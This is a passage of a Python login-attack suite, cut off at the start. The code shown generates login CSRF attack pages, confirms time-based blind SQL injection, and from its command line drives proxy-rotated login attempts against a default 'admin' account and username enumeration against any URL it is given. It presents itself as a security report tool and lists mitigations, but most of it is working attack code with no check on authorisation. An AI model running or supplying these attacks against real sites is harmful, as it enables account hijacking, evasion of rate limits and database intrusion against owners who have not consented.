                          f"{name} — {elapsed}s (baseline {base_mean:.2f}s)",
                          "CRITICAL")
                vuln_found = True
            else:
                print(f"  · {name:<24} {elapsed}s (normal)")

            time.sleep(0.5)

        if not vuln_found:
            print(f"\n{Fore.GREEN}[✅] No timing-based blind SQLi detected")
        else:
            print(f"\n{Fore.RED}[❌] BLIND SQLi CONFIRMED — injectable endpoint!")
            self._log("BLIND_SQLI_CONFIRMED",
                      "login endpoint is injectable via time-based payload",
                      "CRITICAL")

        return vuln_found

    # ═══════════════════════════════════════════════════════════
    # 5️⃣ LOGIN CSRF POC GENERATOR  ⭐ NEW
    # ═══════════════════════════════════════════════════════════
    def generate_csrf_poc(self, output_path="csrf_poc.html",
                          attacker_user="attacker_acct",
                          attacker_pw="attacker_pw"):
        """
        Generate an attacker HTML page that:
        1. Auto-submits login form to target (from victim's browser)
        2. Logs victim in as attacker (login CSRF)
        """
        print(f"\n{Fore.MAGENTA}{'═'*64}")
        print(f"{Fore.MAGENTA} 5️⃣  LOGIN CSRF POC")
        print(f"{Fore.MAGENTA}{'═'*64}")

        # extract form details from cached page
        if not self.page_html:
            try:
                r = self._get_session().get(self.url, timeout=self.timeout)
                self.page_html = r.text
            except Exception:
                print(f"{Fore.RED}[!] Cannot fetch login page"); return None

        soup = BeautifulSoup(self.page_html, 'lxml')
        form = soup.find('form')
        if not form:
            print(f"{Fore.RED}[!] No form found"); return None

        action = urljoin(self.url, form.get('action') or self.url)
        method = (form.get('method') or 'POST').upper()

        # collect form inputs
        inputs = []
        for inp in form.find_all('input'):
            name = inp.get('name')
            if not name: continue
            itype = inp.get('type', 'text')
            value = inp.get('value', '')
            if itype == 'hidden' or name.lower() == self.user_field.lower() or \
               name.lower() == self.pw_field.lower():
                continue  # we'll fill username/password/hidden ourselves
            inputs.append({"name": name, "type": itype, "value": value})

        # Build the POC html
        inputs_html = "\n".join(
            f'<input type="{html_lib.escape(i["type"])}" '
            f'name="{html_lib.escape(i["name"])}" '
            f'value="{html_lib.escape(i["value"])}">'
            for i in inputs
        )

        poc = f"""<!DOCTYPE html>
<html>
<head>
  <title>CSRF POC — Login CSRF Attack</title>
  <style>
    body {{ font-family: sans-serif; background: #0d1117; color: #c9d1d9;
           padding: 30px; }}
    .box {{ background: #161b22; padding: 20px; border-radius: 8px;
           border: 1px solid #30363d; margin: 20px 0; }}
    code {{ background: #21262d; padding: 2px 6px; border-radius: 4px; }}
    button {{ background: #238636; color: white; padding: 10px 20px;
             border: none; border-radius: 6px; cursor: pointer;
             font-size: 16px; }}
    button:hover {{ background: #2ea043; }}
    .warning {{ color: #f85149; }}
    .ok {{ color: #3fb950; }}
  </style>
</head>
<body>
  <h1>⚠️ Login CSRF Proof-of-Concept</h1>
  <div class="box">
    <h3>Attack details</h3>
    <p><b>Target:</b> <code>{html_lib.escape(action)}</code></p>
    <p><b>Method:</b> <code>{html_lib.escape(method)}</code></p>
    <p><b>Attacker username:</b> <code>{html_lib.escape(attacker_user)}</code></p>
  </div>

  <div class="box">
    <h3>💡 How this attack works</h3>
    <ol>
      <li>Attacker sends this HTML page to victim (email, chat, forum).</li>
      <li>Victim opens it — form auto-submits in background.</li>
      <li>Victim is now logged in as <b>attacker's account</b>.</li>
      <li>Victim's actions (cart, uploads, personal data) go to attacker.</li>
    </ol>
  </div>

  <button onclick="document.getElementById('poc-form').submit()">
    ▶ Execute Attack
  </button>

  <form id="poc-form" action="{html_lib.escape(action)}" method="{html_lib.escape(method)}"
        style="display:none" target="_blank">
    <input name="{html_lib.escape(self.user_field)}"
           value="{html_lib.escape(attacker_user)}">
    <input type="password" name="{html_lib.escape(self.pw_field)}"
           value="{html_lib.escape(attacker_pw)}">
    {inputs_html}
  </form>

  <div class="box">
    <h3>🔧 Mitigations</h3>
    <ul>
      <li>Add unique CSRF token per request</li>
      <li>Validate <code>Origin</code>/<code>Referer</code> headers</li>
      <li>Use SameSite=Strict cookies</li>
      <li>Require re-authentication for sensitive actions</li>
    </ul>
  </div>
</body>
</html>"""

        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(poc)
        print(f"{Fore.GREEN}[✓] POC written → {output_path}")

        self._log("CSRF_POC_GENERATED",
                  f"login CSRF POC written to {output_path}", "MEDIUM")
        return output_path

    # ═══════════════════════════════════════════════════════════
    # 6️⃣ HTML DASHBOARD  ⭐ NEW
    # ═══════════════════════════════════════════════════════════
    def generate_dashboard(self, output_path="dashboard.html"):
        print(f"\n{Fore.MAGENTA}{'═'*64}")
        print(f"{Fore.MAGENTA} 6️⃣  HTML DASHBOARD")
        print(f"{Fore.MAGENTA}{'═'*64}")

        sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2,
                     "LOW (good)": 3, "INFO": 4}
        by_sev = defaultdict(int)
        for f in self.findings:
            by_sev[f["severity"]] += 1

        # severity badge counts
        critical = by_sev.get("CRITICAL", 0)
        high     = by_sev.get("HIGH", 0)
        medium   = by_sev.get("MEDIUM", 0)
        good     = by_sev.get("LOW (good)", 0)

        # timeline entries
        timeline_html = "\n".join(
            f"<tr><td>{t['time']}</td>"
            f"<td class='sev-{t['severity'].split()[0].lower()}'>{t['severity']}</td>"
            f"<td>{html_lib.escape(t['type'])}</td>"
            f"<td>{html_lib.escape(t['detail'])}</td></tr>"
            for t in self.timeline
        )

        # findings list
        findings_html = "\n".join(
            f"<div class='finding sev-{f['severity'].split()[0].lower()}-box'>"
            f"<div class='finding-hdr'>"
            f"<span class='badge sev-{f['severity'].split()[0].lower()}'>"
            f"{f['severity']}</span>"
            f"<b>{html_lib.escape(f['type'])}</b></div>"
            f"<p>{html_lib.escape(f['note'])}</p></div>"
            for f in sorted(self.findings,
                            key=lambda x: sev_order.get(x["severity"], 9))
        )

        # Chart data (pure JS)
        chart_data = json.dumps(dict(by_sev))

        html = f"""<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Login Security Report — {html_lib.escape(self.url)}</title>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<style>
* {{ box-sizing: border-box; }}
body {{ font-family: -apple-system, sans-serif; background: #0d1117;
       color: #c9d1d9; margin: 0; padding: 24px; }}
h1,h2 {{ color: #58a6ff; }}
.header {{ border-bottom: 1px solid #30363d; padding-bottom: 16px; }}
.target {{ color: #8b949e; font-size: 14px; }}
.cards {{ display: grid; grid-template-columns: repeat(4, 1fr);
         gap: 16px; margin: 24px 0; }}
.card {{ background: #161b22; padding: 20px; border-radius: 8px;
        border: 1px solid #30363d; text-align: center; }}
.card .num {{ font-size: 42px; font-weight: bold; }}
.card.critical .num {{ color: #f85149; }}
.card.high .num {{ color: #db6d28; }}
.card.medium .num {{ color: #d29922; }}
.card.good .num {{ color: #3fb950; }}
.card .lbl {{ color: #8b949e; font-size: 14px; margin-top: 4px; }}
.chart-box {{ background: #161b22; padding: 20px; border-radius: 8px;
             border: 1px solid #30363d; margin: 24px 0; }}
table {{ width: 100%; border-collapse: collapse; }}
th, td {{ padding: 8px; text-align: left; border-bottom: 1px solid #30363d; }}
th {{ background: #161b22; }}
.badge {{ display: inline-block; padding: 3px 8px; border-radius: 4px;
         font-size: 11px; font-weight: bold; margin-right: 8px; }}
.sev-critical {{ background: #67060c; color: #ffdcd7; }}
.sev-high {{ background: #7d3818; color: #ffd8b5; }}
.sev-medium {{ background: #5f4a0e; color: #f9e2af; }}
.sev-low {{ background: #1a7f37; color: #d6ffdb; }}
.sev-info {{ background: #0c2d6b; color: #cae8ff; }}
.finding {{ padding: 14px; margin: 10px 0; border-radius: 6px;
           border-left: 4px solid #30363d; background: #161b22; }}
.finding.sev-critical-box {{ border-left-color: #f85149; }}
.finding.sev-high-box {{ border-left-color: #db6d28; }}
.finding.sev-medium-box {{ border-left-color: #d29922; }}
.finding.sev-low-box {{ border-left-color: #3fb950; }}
.finding.sev-info-box {{ border-left-color: #58a6ff; }}
.finding p {{ margin: 6px 0 0 0; color: #8b949e; }}
</style>
</head>
<body>

<div class="header">
  <h1>🎯 Login Security Report</h1>
  <div class="target">
    <b>Target:</b> {html_lib.escape(self.url)}<br>
    <b>Generated:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
  </div>
</div>

<div class="cards">
  <div class="card critical">
    <div class="num">{critical}</div>
    <div class="lbl">Critical</div>
  </div>
  <div class="card high">
    <div class="num">{high}</div>
    <div class="lbl">High</div>
  </div>
  <div class="card medium">
    <div class="num">{medium}</div>
    <div class="lbl">Medium</div>
  </div>
  <div class="card good">
    <div class="num">{good}</div>
    <div class="lbl">Passed</div>
  </div>
</div>

<div class="chart-box">
  <h2>Findings by Severity</h2>
  <canvas id="chart" height="90"></canvas>
</div>

<h2>📋 Findings</h2>
{findings_html}

<h2>⏱️ Timeline</h2>
<table>
<thead><tr><th>Time</th><th>Severity</th><th>Type</th><th>Detail</th></tr></thead>
<tbody>
{timeline_html}
</tbody>
</table>

<script>
const data = {chart_data};
const ctx = document.getElementById('chart');
new Chart(ctx, {{
  type: 'doughnut',
  data: {{
    labels: Object.keys(data),
    datasets: [{{
      data: Object.values(data),
      backgroundColor: ['#f85149','#db6d28','#d29922','#3fb950','#58a6ff']
    }}]
  }},
  options: {{
    plugins: {{ legend: {{ labels: {{ color: '#c9d1d9' }} }} }},
    responsive: true
  }}
}});
</script>

</body>
</html>"""

        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(html)
        print(f"{Fore.GREEN}[✓] Dashboard → {output_path}")
        return output_path

    # ─────────── save json ───────────
    def save(self, path="login_suite.json"):
        with open(path, "w") as f:
            json.dump({
                "target": self.url,
                "timestamp": datetime.now().isoformat(),
                "findings": self.findings,
                "timeline": self.timeline,
            }, f, indent=2, default=str)
        print(f"{Fore.GREEN}[✓] JSON → {path}")

    def summary(self):
        print(f"\n{Fore.MAGENTA}{'═'*64}")
        print(f"{Fore.MAGENTA} FINAL SUMMARY — {len(self.findings)} findings")
        print(f"{Fore.MAGENTA}{'═'*64}")
        sev_c = {"CRITICAL": Fore.RED, "HIGH": Fore.RED,
                 "MEDIUM": Fore.YELLOW, "LOW (good)": Fore.GREEN,
                 "INFO": Fore.CYAN}
        for f in self.findings:
            c = sev_c.get(f["severity"], Fore.WHITE)
            print(f"  {c}[{f['severity']:<10}]{Style.RESET_ALL} "
                  f"{f['type']:<32} {f['note'][:60]}")


# ═══════════════════════════════════════════════════════════════
#                         CLI
# ═══════════════════════════════════════════════════════════════

def main():
    p = argparse.ArgumentParser(description="Login Security Suite — All Modules")
    p.add_argument("url")
    p.add_argument("username", nargs="?", default="admin")
    p.add_argument("--user-field", default="username")
    p.add_argument("--pw-field",   default="password")
    p.add_argument("--proxy-list", dest="proxy_file",
                   help="file with proxies (one per line)")
    p.add_argument("--userlist", help="file with usernames for enumeration")
    p.add_argument("--check-proxies", action="store_true",
                   help="test proxy health before running")
    p.add_argument("--attempts", type=int, default=3)
    p.add_argument("--samples",  type=int, default=3)
    p.add_argument("--sleep-sec", type=int, default=3,
                   help="SQLi sleep payload seconds")
    p.add_argument("--test", default="all",
                   help="comma list: dist,enum,csrf,sqli,poc,dash or 'all'")
    p.add_argument("--cookie", help="'k=v; k2=v2'")
    p.add_argument("--header", action="append")
    p.add_argument("--no-verify", action="store_true")
    p.add_argument("-o", "--outdir", default="login_out")
    args = p.parse_args()

    os.makedirs(args.outdir, exist_ok=True)

    # ── proxies ──
    proxies = []
    if args.proxy_file:
        with open(args.proxy_file) as f:
            proxies = [l.strip() for l in f
                       if l.strip() and not l.startswith('#')]

    if args.check_proxies and proxies:
        proxies, _ = ProxyChecker.check_all(proxies)

    # ── usernames ──
    users = [args.username]
    if args.userlist:
        with open(args.userlist) as f:
            users = [l.strip() for l in f if l.strip()]

    # ── cookies/headers ──
    cookies = {}
    if args.cookie:
        for kv in args.cookie.split(';'):
            if '=' in kv:
                k, v = kv.strip().split('=', 1)
                cookies[k] = v
    headers = {}
    if args.header:
        for h in args.header:
            if ':' in h:
                k, v = h.split(':', 1)
                headers[k.strip()] = v.strip()

    # ── run ──
    suite = LoginSuite(
        args.url, username_field=args.user_field,
        password_field=args.pw_field, headers=headers,
        cookies=cookies, proxy_list=proxies,
        verify_ssl=not args.no_verify,
    )

    tests = [t.strip() for t in args.test.split(",")]
    do_all = "all" in tests

    if do_all or "dist" in tests:
        suite.distributed_test(args.username, attempts_per_proxy=args.attempts)
    if do_all or "enum" in tests:
        suite.enumerate_accounts(users, samples=args.samples)
    if do_all or "csrf" in tests:
        suite.csrf_test(args.username, [f"pw_{i}" for i in range(3)])
    if do_all or "sqli" in tests:
        suite.blind_sqli_test(args.username, sleep_sec=args.sleep_sec)
    if do_all or "poc" in tests:
        suite.generate_csrf_poc(
            output_path=os.path.join(args.outdir, "csrf_poc.html"))
    if do_all or "dash" in tests:
        suite.generate_dashboard(
            output_path=os.path.join(args.outdir, "dashboard.html"))

    suite.save(os.path.join(args.outdir, "login_suite.json"))
    suite.summary()


if __name__ == "__main__":
    main()